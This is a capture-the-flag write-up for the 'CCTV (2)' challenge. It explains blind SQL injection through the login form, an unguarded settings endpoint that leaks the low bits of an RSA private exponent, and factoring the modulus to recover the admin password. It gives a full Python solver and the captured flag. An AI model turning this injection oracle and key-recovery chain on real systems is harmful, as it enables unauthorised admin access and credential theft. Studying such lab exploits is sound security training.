---
title: "HyperSonic CTF 2026 CCTV (2) Writeup"
description: "HyperSonic CTF 2026 CCTV (2) writeup"
---

# CCTV (2)

## Overview

`CCTV (2)` is a challenge where you create an administrator session in the HS-CCTV management console and then read the `Supervisor Token` shown on the dashboard.

The regular user session we obtained in `CCTV (1)` alone does not reveal the admin area. So the starting point is to find, among the features reachable with a user session, the one that leads to admin authentication. Looking at the provided program, the settings page only checks whether you are logged in, and its overlay preview feature leaks part of the RSA private exponent.

The solution flow is as follows. First we use the same SQL injection to read the public modulus `N` and the administrator's password ciphertext. With a regular user session we call overlay preview to obtain the lower 1024 bits of the private exponent `d`. We plug this value into the RSA relations to factor `N` and recover the administrator's local password.

## Analyzing the challenge

The main symbols and values used in this writeup:

- `N`: the RSA modulus used to verify account passwords.
- `e`: the RSA public exponent. In the provided program it is `65537`.
- `d`: the RSA private exponent.
- `d0`: the lower 1024 bits of `d` leaked by overlay preview.
- `R`: `2^1024`.
- `p`, `q`: the 1024-bit primes that make up `N`.
- `s`: `p + q`.
- `C_admin`: the RSA ciphertext of the administrator's local password.
- `operator`: a regular user account with `role='user'`.

The dashboard renders the `Supervisor Token` only when the session's `role` is `admin`.

```html
{{ADMIN_PANEL}}
```

Internally, when the session is an admin one, a panel of the following form is inserted.

```html
<section class="card" style="margin-top:14px">
  <div class="label">Supervisor Token</div>
  <div class="value service-token">%s</div>
</section>
```

Conversely, a regular user session only shows the `Maintenance Token`. So in `CCTV (2)` you must log in as the administrator account.

The accounts table contains the administrator account's `local_password_cipher`. The provided program also stores the RSA public parameters in a `device_public_params` table.

```sql
CREATE TABLE device_public_params (
    name TEXT PRIMARY KEY,
    value TEXT NOT NULL
);

INSERT INTO device_public_params(name, value)
VALUES('account_rsa_n', '{{ACCOUNT_RSA_N}}');

INSERT INTO device_public_params(name, value)
VALUES('account_rsa_e', '{{ACCOUNT_RSA_E}}');
```

Local password verification is equivalent to the following computation.

```text
C = password^e mod N
e = 65537
```

The SQL injection used in `CCTV (1)` still works. So `N` and `C_admin` can be read via blind SQL injection. The problem is that decrypting `C_admin` requires `d`, or `p` and `q`.

Administrator LDAP login is blocked in the code.

```text
if mode == "ldap" and username == "admin":
    reject
```

So, unlike (1), you cannot create an admin session with just an LDAP empty-password bind. This is where the settings page comes in. The settings POST handlers all check only whether a session exists and never check `role`. A regular user session can call overlay preview too.

The behavior of the overlay preview function can be summarized as follows.

```text
buf = zero-filled buffer
buf[0:len(label)] = label
BN_bn2lebinpad(d, buf + 0x20, 0x100)
preview = hex(buf[0:length])
length <= 160
```

`label` is at most 32 bytes, and `d` is written as 256 little-endian bytes starting at `buf + 0x20`. Since the maximum value of `length` is 160, the emitted preview includes the following regions.

```text
buf[0:32]     = label and 0 padding
buf[32:160]  = lower 128 bytes of d
```

In other words, even with regular user privileges you can obtain `d mod 2^1024`.

## Key idea

In RSA the following relations hold.

```text
N = p*q
phi = (p-1)*(q-1)
phi = N - (p+q) + 1
e*d - 1 = k*phi
1 <= k < e
```

Letting `s = p + q`, we can write it as follows.

```text
e*d - 1 = k*(N - s + 1)
```

Overlay preview does not give us the full `d`, but we know `d0 = d mod R`. Reducing both sides modulo `R = 2^1024`, we get the following equation.

```text
A = (e*d0 - 1) mod R
A = k*(N - s + 1) mod R
```

Since `k` is smaller than `e`, we only need to check at most `65536` values. For each `k` we build a candidate `s` and test with the discriminant whether `s` is the real `p + q`.

```text
g = gcd(k, R)
A % g == 0
R2 = R / g
s0 = N + 1 - (A/g) * inverse(k/g, R2) mod R2
s_candidate = s0 + t*R2
D = s_candidate^2 - 4*N
```

If `D` is a perfect square, we can recover `p` and `q`.

```text
p = (s_candidate - sqrt(D)) / 2
q = (s_candidate + sqrt(D)) / 2
```

Once we have `p` and `q`, we can recompute `phi` and `d`, decrypt `C_admin`, and obtain the administrator password.

## Solution walkthrough

### Step 1. Confirm the condition for emitting the admin token

First I checked the dashboard rendering flow. The `Supervisor Token` is added to `ADMIN_PANEL` only for an admin session. A regular user session does not emit this region.

So the user session from (1) is just a starting point. The ultimate goal is to recover the password needed for the administrator's local login.

### Step 2. Extract RSA public values and the admin ciphertext via SQL injection

The `local` login SQL injection can read not only the `users` table but also other tables in the same SQLite database. First we extract the RSA modulus and the admin ciphertext.

```sql
SELECT value FROM device_public_params WHERE name='account_rsa_n'
```

```sql
SELECT local_password_cipher FROM users WHERE role='admin' LIMIT 1
```

Both values are hexadecimal strings. Since the results are not printed directly, we recover the strings using `substr` comparisons. Because they are long, you could read one character at a time, but the actual solver reduces the number of requests by binary-searching 8 digits at a time.

### Step 3. Leak `d0` from overlay preview

With a user session we send a POST request to `/settings/overlay`. We keep `label` as a short safe string and set `length` to the maximum allowed value, `160`.

```text
label=A
length=160
```

The response has the following form.

```text
preview=<hex string>
```

Converting this hex string to bytes, the first 32 bytes are the label and padding. The following 128 bytes are the lower bytes of `d`.

```text
d0 = little_endian(preview_bytes[32:160])
```

Here it must be interpreted as little-endian, because the function calls `BN_bn2lebinpad` to store the BIGNUM as a little-endian byte string.

### Step 4. Factor `N` using `d0`

Now we have `N`, `e`, and `d0`. We substitute `k` from `1` to `e - 1`, building a candidate `s = p + q` each time.

`k` may be even, so we do not compute an inverse right away. First we divide by `gcd(k, R)` to check whether the congruence is solvable. Then we compute `s0` in `R2` and check the possible lifts within the range that `p` and `q` are 1024-bit primes.

The moment the discriminant becomes a perfect square, `p` and `q` are determined.

```text
D = s^2 - 4*N
D is square
```

When this condition is met, we recover the two primes with the following formulas.

```text
p = (s - sqrt(D)) / 2
q = (s + sqrt(D)) / 2
```

### Step 5. Recover the admin password and log in

Once we have `p` and `q`, standard RSA decryption suffices.

```text
phi = (p-1)*(q-1)
d = inverse(e, phi)
admin_password = C_admin^d mod N
```

Converting the decrypted integer to a big-endian byte string gives the administrator's local password. Then logging in with `mode=local`, `username=admin` issues an admin session, and we can read the `Supervisor Token` from the dashboard.

## Exploit / solver

The core flow of the solver is as follows.

1. Extract the operator name, `N`, and `C_admin` via the `local` login SQL injection.
2. Perform an LDAP empty-password login with the operator name to get a user session.
3. Call overlay preview to obtain `d0 = d mod 2^1024`.
4. Recover `p` and `q` from `N`, `e`, and `d0`.
5. Decrypt the admin password and read the `Supervisor Token` via local admin login.

The code below only collects the core routines. The target address is assumed to be received as a runtime argument.

```python
import math
import re
import string
from urllib.parse import urljoin

import requests


HEX = "0123456789abcdef"
USER_CHARS = string.ascii_letters + string.digits + "_-."
E = 65537
R = 1 << 1024


class Oracle:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/") + "/"
        self.session = requests.Session()

    def query(self, condition):
        payload = "' OR (" + condition + ") -- "
        r = self.session.post(
            urljoin(self.base, "login"),
            data={"mode": "local", "username": payload, "password": "x"},
            timeout=10,
            allow_redirects=False,
        )

        if "Password verification failed." in r.text:
            return True
        if "Account not found." in r.text:
            return False
        raise RuntimeError("unexpected oracle response")

    def extract_int(self, expr, lo, hi):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.query(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract_text(self, expr, alphabet, max_len):
        length = self.extract_int(f"length(({expr}))", 0, max_len)
        out = []

        for pos in range(1, length + 1):
            for ch in alphabet:
                if self.query(f"substr(({expr}),{pos},1)='{ch}'"):
                    out.append(ch)
                    break
            else:
                raise RuntimeError(f"no character match at {pos}")

        return "".join(out)

    def extract_hex_by_chunk(self, expr, length, width=8):
        out = []

        for start in range(1, length + 1, width):
            size = min(width, length - start + 1)
            lo = 0
            hi = 16 ** size - 1

            while lo < hi:
                mid = (lo + hi) // 2
                mid_hex = f"{mid:0{size}x}"
                cond = f"substr(({expr}),{start},{size})>'{mid_hex}'"
                if self.query(cond):
                    lo = mid + 1
                else:
                    hi = mid

            out.append(f"{lo:0{size}x}")

        return "".join(out)


def leak_d0(base_url, operator):
    session = requests.Session()
    session.post(
        urljoin(base_url.rstrip("/") + "/", "login"),
        data={"mode": "ldap", "username": operator, "password": ""},
        timeout=10,
        allow_redirects=False,
    )

    r = session.post(
        urljoin(base_url.rstrip("/") + "/", "settings/overlay"),
        data={"label": "A", "length": "160"},
        timeout=10,
    )
    m = re.search(r"preview=([0-9a-f]+)", r.text)
    if not m:
        raise RuntimeError("overlay preview not found")

    preview = bytes.fromhex(m.group(1))
    return int.from_bytes(preview[32:160], "little")


def recover_factors(n, e, d0):
    a_value = (e * d0 - 1) % R
    s_min = 1 << 1024
    s_max = 1 << 1025

    for k in range(1, e):
        g = math.gcd(k, R)
        if a_value % g != 0:
            continue

        r2 = R // g
        left = a_value // g
        k2 = k // g

        s0 = (n + 1 - left * pow(k2, -1, r2)) % r2
        lift_start = max(0, (s_min - s0 + r2 - 1) // r2)
        lift_end = (s_max - s0 + r2 - 1) // r2

        for lift in range(lift_start, lift_end + 1):
            s = s0 + lift * r2
            disc = s * s - 4 * n
            if disc < 0:
                continue

            root = math.isqrt(disc)
            if root * root != disc:
                continue

            p = (s - root) // 2
            q = (s + root) // 2
            if p * q == n:
                return p, q

    raise RuntimeError("failed to factor modulus")


def solve(base_url):
    oracle = Oracle(base_url)

    operator = oracle.extract_text(
        "SELECT username FROM users WHERE role='user' LIMIT 1",
        USER_CHARS,
        64,
    )

    n_hex = oracle.extract_hex_by_chunk(
        "SELECT value FROM device_public_params WHERE name='account_rsa_n'",
        512,
    )
    c_hex = oracle.extract_hex_by_chunk(
        "SELECT local_password_cipher FROM users WHERE role='admin' LIMIT 1",
        512,
    )

    n = int(n_hex, 16)
    c_admin = int(c_hex, 16)
    d0 = leak_d0(base_url, operator)

    p, q = recover_factors(n, E, d0)
    phi = (p - 1) * (q - 1)
    d = pow(E, -1, phi)

    password_int = pow(c_admin, d, n)
    password = password_int.to_bytes(
        (password_int.bit_length() + 7) // 8,
        "big",
    ).decode()

    session = requests.Session()
    session.post(
        urljoin(base_url.rstrip("/") + "/", "login"),
        data={"mode": "local", "username": "admin", "password": password},
        timeout=10,
        allow_redirects=False,
    )

    dashboard = session.get(
        urljoin(base_url.rstrip("/") + "/", "dashboard"),
        timeout=10,
    ).text

    token = re.search(
        r"Supervisor Token.*?service-token[^>]*>([^<]+)<",
        dashboard,
        re.S,
    )
    if not token:
        raise RuntimeError("supervisor token not found")

    return token.group(1).strip()
```

## Result

On the actual target I obtained the lower 1024 bits of `d` via overlay preview and used them to factor `N`. After logging in locally with the recovered administrator password, I read the following value from the dashboard's `Supervisor Token`.

```text
HS{v3ry_3asy_c0ppersm1th!!!!!!!!!!}
```
